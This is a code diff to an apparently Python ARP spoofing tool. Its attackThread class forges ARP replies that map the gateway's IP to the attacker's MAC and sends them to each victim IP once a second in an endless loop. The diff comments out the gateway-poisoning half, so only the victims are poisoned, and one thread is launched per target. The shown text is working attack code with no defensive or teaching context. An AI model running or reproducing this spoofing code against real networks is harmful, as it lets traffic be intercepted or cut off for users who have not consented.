@@ -40,21 +40,21 @@ class attackThread(threading.Thread):
 
 	def run(self):
 		victim_mac = self.get_mac(self.victim)
-		gateway_mac = self.get_mac(self.gateway)
+		#gateway_mac = self.get_mac(self.gateway)
 
 		epacket1 = victim_mac + self.mac + self.arp
-		epacket2 = gateway_mac + self.mac + self.arp
+		#epacket2 = gateway_mac + self.mac + self.arp
 
 		gip = socket.inet_aton(self.gateway)
 		vip = socket.inet_aton(self.victim)
 
 		victim_arp = epacket1 + self.protocol + self.mac + gip + victim_mac + vip
-		gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
+		#gateway_arp = epacket2 + self.protocol + self.mac + vip + gateway_mac + gip
 
 		while True:
 			self.connect.send(victim_arp)
-			print("  Packet send to " + self.victim)
-			self.connect.send(gateway_arp)
+			print("packet send to " + self.victim)
+			#self.connect.send(gateway_arp)
 			time.sleep(1)
 
 
@@ -76,7 +76,7 @@ class attackThread(threading.Thread):
 
 
 def attack(ips):
-	global threads, mac
+	global threads, mac, gateway_ip
 
 	for ip in ips:
 		threads.append(attackThread(gateway_ip, ip, mac, s))
